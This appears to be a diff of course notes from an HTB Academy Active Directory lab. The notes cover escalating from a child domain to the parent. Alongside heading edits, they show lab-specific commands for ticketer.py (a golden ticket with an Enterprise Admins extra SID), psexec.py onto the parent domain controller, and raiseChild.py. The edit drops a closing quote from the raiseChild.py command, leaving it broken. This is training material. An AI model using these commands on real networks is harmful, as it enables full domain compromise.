@@ -59,8 +59,7 @@ lookupsid.py 'logistics.inlanefreight.local/htb-student_adm:HTB_@cademy_stdnt_ad
 ```bash
 ticketer.py -nthash <krbtgt_NTLM_hash> -domain <Our_current_child_domain> -domain-sid <sid_of_child_domain> -extra-sid <sid_of_enterprise_admins_group> hacker
 ```
-
-Example:
+#### Example
 
 ```bash
 ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
@@ -101,12 +100,12 @@ Log into the `Parent` DC:
 ```bash
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
 ```
-### raiseChild.py
+#### raiseChild.py
 
 All of the above can be done with this:
 
 ```bash
-raiseChild.py -target-exec <parent_dc_ip> '<child_domain>/<domain_admin>:<password>'
+raiseChild.py -target-exec <parent_dc_ip> '<child_domain>/<domain_admin>:<password>
 ```
 
 Example:
